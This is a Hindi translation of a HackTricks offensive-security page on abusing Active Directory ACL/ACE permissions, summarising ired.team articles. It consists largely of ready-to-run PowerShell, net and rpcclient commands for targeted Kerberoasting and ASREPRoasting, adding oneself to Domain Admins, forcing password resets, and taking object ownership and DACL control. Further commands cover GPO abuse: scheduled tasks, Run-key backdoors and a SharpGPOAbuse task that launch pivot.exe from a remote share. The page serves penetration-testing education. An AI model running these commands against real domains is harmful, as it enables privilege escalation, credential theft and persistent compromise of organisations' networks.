# Active Directory ACLs/ACEs का दुरुपयोग

{{#include ../../../banners/hacktricks-training.md}}

**यह पृष्ठ मुख्य रूप से** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **और** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)** से तकनीकों का एक सारांश है। अधिक विवरण के लिए, मूल लेखों की जांच करें।**

## **उपयोगकर्ता पर GenericAll अधिकार**

यह विशेषाधिकार एक हमलावर को लक्षित उपयोगकर्ता खाते पर पूर्ण नियंत्रण प्रदान करता है। एक बार जब `Get-ObjectAcl` कमांड का उपयोग करके `GenericAll` अधिकारों की पुष्टि हो जाती है, तो एक हमलावर कर सकता है:

- **लक्षित का पासवर्ड बदलें**: `net user <username> <password> /domain` का उपयोग करके, हमलावर उपयोगकर्ता का पासवर्ड रीसेट कर सकता है।
- **लक्षित Kerberoasting**: उपयोगकर्ता के खाते को kerberoastable बनाने के लिए एक SPN असाइन करें, फिर Rubeus और targetedKerberoast.py का उपयोग करके टिकट-ग्रांटिंग टिकट (TGT) हैश को निकालें और क्रैक करने का प्रयास करें।
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: उपयोगकर्ता के लिए प्री-प्रमाणीकरण को निष्क्रिय करें, जिससे उनका खाता ASREPRoasting के लिए संवेदनशील हो जाता है।
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll अधिकार समूह पर**

यह विशेषाधिकार एक हमलावर को समूह की सदस्यता को नियंत्रित करने की अनुमति देता है यदि उनके पास `GenericAll` अधिकार हैं जैसे कि `Domain Admins` पर। समूह का विशिष्ट नाम पहचानने के बाद `Get-NetGroup` के साथ, हमलावर कर सकता है:

- **अपने आप को Domain Admins समूह में जोड़ें**: यह सीधे कमांड के माध्यम से या Active Directory या PowerSploit जैसे मॉड्यूल का उपयोग करके किया जा सकता है।
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**

इन विशेषाधिकारों को एक कंप्यूटर ऑब्जेक्ट या एक उपयोगकर्ता खाते पर रखने से निम्नलिखित की अनुमति मिलती है:

- **Kerberos Resource-based Constrained Delegation**: एक कंप्यूटर ऑब्जेक्ट पर नियंत्रण प्राप्त करने की अनुमति देता है।
- **Shadow Credentials**: इस तकनीक का उपयोग करके एक कंप्यूटर या उपयोगकर्ता खाते का अनुकरण करें, विशेषाधिकारों का उपयोग करके शैडो क्रेडेंशियल्स बनाने के लिए।

## **WriteProperty on Group**

यदि एक उपयोगकर्ता के पास एक विशिष्ट समूह (जैसे, `Domain Admins`) के सभी ऑब्जेक्ट्स पर `WriteProperty` अधिकार हैं, तो वे:

- **Domain Admins Group में खुद को जोड़ सकते हैं**: `net user` और `Add-NetGroupUser` कमांड्स को मिलाकर यह विधि डोमेन के भीतर विशेषाधिकार वृद्धि की अनुमति देती है।
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

यह विशेषाधिकार हमलावरों को `Domain Admins` जैसे विशिष्ट समूहों में स्वयं को जोड़ने की अनुमति देता है, ऐसे आदेशों के माध्यम से जो समूह की सदस्यता को सीधे नियंत्रित करते हैं। निम्नलिखित आदेश अनुक्रम का उपयोग करके स्वयं को जोड़ना संभव है:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

एक समान विशेषाधिकार, यह हमलावरों को समूह गुणों को संशोधित करके सीधे समूहों में स्वयं को जोड़ने की अनुमति देता है यदि उनके पास उन समूहों पर `WriteProperty` अधिकार है। इस विशेषाधिकार की पुष्टि और निष्पादन किया जाता है:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

`User-Force-Change-Password` के लिए एक उपयोगकर्ता पर `ExtendedRight` रखने से वर्तमान पासवर्ड को जाने बिना पासवर्ड रीसेट करने की अनुमति मिलती है। इस अधिकार की पुष्टि और इसके शोषण को PowerShell या वैकल्पिक कमांड-लाइन उपकरणों के माध्यम से किया जा सकता है, जो उपयोगकर्ता के पासवर्ड को रीसेट करने के लिए कई विधियाँ प्रदान करते हैं, जिसमें इंटरैक्टिव सत्र और गैर-इंटरैक्टिव वातावरण के लिए एक-लाइनर शामिल हैं। कमांड सरल PowerShell आवाहनों से लेकर Linux पर `rpcclient` का उपयोग करने तक होते हैं, जो हमले के वेक्टर की बहुपरकारीता को प्रदर्शित करते हैं।
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

यदि एक हमलावर को पता चलता है कि उनके पास एक समूह पर `WriteOwner` अधिकार हैं, तो वे समूह की स्वामित्व को अपने नाम पर बदल सकते हैं। यह विशेष रूप से महत्वपूर्ण है जब संबंधित समूह `Domain Admins` है, क्योंकि स्वामित्व बदलने से समूह के गुणों और सदस्यता पर व्यापक नियंत्रण मिलता है। प्रक्रिया में `Get-ObjectAcl` के माध्यम से सही ऑब्जेक्ट की पहचान करना और फिर `Set-DomainObjectOwner` का उपयोग करके स्वामी को SID या नाम द्वारा संशोधित करना शामिल है।
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

यह अनुमति एक हमलावर को उपयोगकर्ता गुणों को संशोधित करने की अनुमति देती है। विशेष रूप से, `GenericWrite` पहुंच के साथ, हमलावर उपयोगकर्ता के लॉगिन स्क्रिप्ट पथ को बदल सकता है ताकि उपयोगकर्ता लॉगिन पर एक दुर्भावनापूर्ण स्क्रिप्ट निष्पादित हो सके। यह `Set-ADObject` कमांड का उपयोग करके लक्षित उपयोगकर्ता के `scriptpath` गुण को हमलावर की स्क्रिप्ट की ओर इंगित करने के लिए अपडेट करके प्राप्त किया जाता है।
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

इस विशेषाधिकार के साथ, हमलावर समूह की सदस्यता को नियंत्रित कर सकते हैं, जैसे कि स्वयं या अन्य उपयोगकर्ताओं को विशिष्ट समूहों में जोड़ना। इस प्रक्रिया में एक क्रेडेंशियल ऑब्जेक्ट बनाना, इसका उपयोग करके समूह से उपयोगकर्ताओं को जोड़ना या हटाना, और PowerShell कमांड के साथ सदस्यता परिवर्तनों की पुष्टि करना शामिल है।
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

AD ऑब्जेक्ट का मालिक होना और उस पर `WriteDACL` विशेषाधिकार होना एक हमलावर को ऑब्जेक्ट पर `GenericAll` विशेषाधिकार देने की अनुमति देता है। यह ADSI हेरफेर के माध्यम से पूरा किया जाता है, जो ऑब्जेक्ट पर पूर्ण नियंत्रण और इसके समूह सदस्यताओं को संशोधित करने की क्षमता प्रदान करता है। इसके बावजूद, Active Directory मॉड्यूल के `Set-Acl` / `Get-Acl` cmdlets का उपयोग करके इन विशेषाधिकारों का शोषण करने में सीमाएँ हैं।
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **डोमेन पर पुनरुत्पादन (DCSync)**

DCSync हमला डोमेन पर विशिष्ट पुनरुत्पादन अनुमतियों का लाभ उठाता है ताकि एक डोमेन कंट्रोलर की नकल की जा सके और डेटा को समन्वयित किया जा सके, जिसमें उपयोगकर्ता क्रेडेंशियल शामिल हैं। यह शक्तिशाली तकनीक `DS-Replication-Get-Changes` जैसी अनुमतियों की आवश्यकता होती है, जिससे हमलावरों को डोमेन कंट्रोलर तक सीधे पहुंच के बिना AD वातावरण से संवेदनशील जानकारी निकालने की अनुमति मिलती है। [**DCSync हमले के बारे में अधिक जानें।**](../dcsync.md)

## GPO प्रतिनिधित्व <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO प्रतिनिधित्व

ग्रुप पॉलिसी ऑब्जेक्ट्स (GPOs) को प्रबंधित करने के लिए प्रतिनिधि पहुंच महत्वपूर्ण सुरक्षा जोखिम प्रस्तुत कर सकती है। उदाहरण के लिए, यदि किसी उपयोगकर्ता जैसे `offense\spotless` को GPO प्रबंधन अधिकार सौंपे जाते हैं, तो उनके पास **WriteProperty**, **WriteDacl**, और **WriteOwner** जैसी विशेषताएँ हो सकती हैं। इन अनुमतियों का दुरुपयोग दुर्भावनापूर्ण उद्देश्यों के लिए किया जा सकता है, जैसा कि PowerView का उपयोग करके पहचाना गया: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### GPO अनुमतियों की गणना करें

गलत कॉन्फ़िगर किए गए GPOs की पहचान करने के लिए, PowerSploit के cmdlets को एक साथ जोड़ा जा सकता है। यह एक विशिष्ट उपयोगकर्ता के प्रबंधित करने के लिए अनुमतियों वाले GPOs की खोज की अनुमति देता है: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**एक दिए गए नीति के साथ कंप्यूटर**: यह निर्धारित करना संभव है कि एक विशिष्ट GPO किन कंप्यूटरों पर लागू होता है, जिससे संभावित प्रभाव के दायरे को समझने में मदद मिलती है। `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**एक दिए गए कंप्यूटर पर लागू नीतियाँ**: यह देखने के लिए कि एक विशेष कंप्यूटर पर कौन सी नीतियाँ लागू हैं, `Get-DomainGPO` जैसे आदेशों का उपयोग किया जा सकता है।

**एक दिए गए नीति के साथ OUs**: एक दिए गए नीति से प्रभावित संगठनात्मक इकाइयों (OUs) की पहचान `Get-DomainOU` का उपयोग करके की जा सकती है।

### GPO का दुरुपयोग - New-GPOImmediateTask

गलत कॉन्फ़िगर किए गए GPOs का उपयोग कोड निष्पादित करने के लिए किया जा सकता है, उदाहरण के लिए, एक तात्कालिक अनुसूचित कार्य बनाने के द्वारा। यह प्रभावित मशीनों पर स्थानीय प्रशासकों समूह में एक उपयोगकर्ता जोड़ने के लिए किया जा सकता है, जिससे विशेषाधिकार में महत्वपूर्ण वृद्धि होती है:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy मॉड्यूल, यदि स्थापित है, तो नए GPO बनाने और लिंक करने की अनुमति देता है, और प्रभावित कंप्यूटरों पर बैकडोर निष्पादित करने के लिए रजिस्ट्री मान जैसे प्राथमिकताएँ सेट करता है। इस विधि के लिए GPO को अपडेट करना और निष्पादन के लिए कंप्यूटर में एक उपयोगकर्ता का लॉगिन करना आवश्यक है:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - GPO का दुरुपयोग

SharpGPOAbuse मौजूदा GPOs का दुरुपयोग करने के लिए एक विधि प्रदान करता है, जिसमें नए GPOs बनाने की आवश्यकता के बिना कार्य जोड़ना या सेटिंग्स को संशोधित करना शामिल है। इस उपकरण को परिवर्तन लागू करने से पहले मौजूदा GPOs में संशोधन करने या नए बनाने के लिए RSAT उपकरणों का उपयोग करने की आवश्यकता होती है:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### नीति अपडेट को मजबूर करना

GPO अपडेट आमतौर पर हर 90 मिनट में होते हैं। इस प्रक्रिया को तेज करने के लिए, विशेष रूप से परिवर्तन लागू करने के बाद, लक्ष्य कंप्यूटर पर `gpupdate /force` कमांड का उपयोग किया जा सकता है ताकि तुरंत नीति अपडेट को मजबूर किया जा सके। यह कमांड सुनिश्चित करता है कि GPO में किए गए किसी भी संशोधन को अगले स्वचालित अपडेट चक्र की प्रतीक्षा किए बिना लागू किया जाए।

### अंदर की बात

किसी दिए गए GPO के लिए अनुसूचित कार्यों की जांच करने पर, जैसे कि `Misconfigured Policy`, `evilTask` जैसे कार्यों की अतिरिक्तता की पुष्टि की जा सकती है। ये कार्य स्क्रिप्ट या कमांड-लाइन उपकरणों के माध्यम से बनाए जाते हैं जो सिस्टम व्यवहार को संशोधित करने या विशेषाधिकार बढ़ाने का लक्ष्य रखते हैं।

कार्य की संरचना, जैसा कि `New-GPOImmediateTask` द्वारा उत्पन्न XML कॉन्फ़िगरेशन फ़ाइल में दिखाया गया है, अनुसूचित कार्य के विशिष्टताओं को रेखांकित करता है - जिसमें निष्पादित करने के लिए कमांड और इसके ट्रिगर्स शामिल हैं। यह फ़ाइल दर्शाती है कि GPOs के भीतर अनुसूचित कार्यों को कैसे परिभाषित और प्रबंधित किया जाता है, नीति प्रवर्तन के हिस्से के रूप में मनमाने कमांड या स्क्रिप्ट को निष्पादित करने के लिए एक विधि प्रदान करती है।

### उपयोगकर्ता और समूह

GPOs लक्ष्य प्रणालियों पर उपयोगकर्ता और समूह सदस्यताओं में हेरफेर की अनुमति भी देते हैं। उपयोगकर्ता और समूह नीति फ़ाइलों को सीधे संपादित करके, हमलावर विशेषाधिकार प्राप्त समूहों, जैसे कि स्थानीय `administrators` समूह में उपयोगकर्ताओं को जोड़ सकते हैं। यह GPO प्रबंधन अनुमतियों के प्रतिनिधित्व के माध्यम से संभव है, जो नीति फ़ाइलों को नए उपयोगकर्ताओं को शामिल करने या समूह सदस्यताओं को बदलने के लिए संशोधित करने की अनुमति देता है।

उपयोगकर्ता और समूह के लिए XML कॉन्फ़िगरेशन फ़ाइल यह रेखांकित करती है कि ये परिवर्तन कैसे लागू किए जाते हैं। इस फ़ाइल में प्रविष्टियाँ जोड़कर, विशिष्ट उपयोगकर्ताओं को प्रभावित प्रणालियों में उच्च विशेषाधिकार दिए जा सकते हैं। यह विधि GPO हेरफेर के माध्यम से विशेषाधिकार बढ़ाने के लिए एक सीधा दृष्टिकोण प्रदान करती है।

इसके अलावा, कोड निष्पादित करने या स्थिरता बनाए रखने के लिए अतिरिक्त विधियाँ, जैसे कि लॉगिन/लॉगऑफ स्क्रिप्ट का लाभ उठाना, ऑटोरन के लिए रजिस्ट्री कुंजियों को संशोधित करना, .msi फ़ाइलों के माध्यम से सॉफ़्टवेयर स्थापित करना, या सेवा कॉन्फ़िगरेशन को संपादित करना भी विचार किया जा सकता है। ये तकनीकें GPOs के दुरुपयोग के माध्यम से लक्ष्य प्रणालियों पर पहुंच बनाए रखने और नियंत्रण करने के लिए विभिन्न मार्ग प्रदान करती हैं।

## संदर्भ

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
